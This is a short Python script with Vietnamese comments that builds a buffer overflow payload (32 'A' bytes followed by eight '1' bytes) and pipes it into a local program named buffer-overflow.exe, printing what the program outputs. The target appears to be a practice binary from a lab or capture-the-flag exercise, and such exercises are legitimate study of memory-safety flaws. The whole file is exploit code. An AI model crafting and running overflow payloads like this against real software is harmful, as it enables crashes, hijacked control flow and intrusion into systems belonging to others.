import subprocess

# Tạo chuỗi khai thác: 32 ký tự bất kỳ + 8 ký tự để khai thác
payload = b"A" * 32 + b"11111111"


# Chạy chương trình với payload
try:
    result = subprocess.run(
        ["buffer-overflow.exe"], input=payload, text=False, capture_output=True
    )
    print("Output:")
    print(result.stdout.decode())
except Exception as e:
    print(f"Lỗi khi chạy khai thác: {e}")
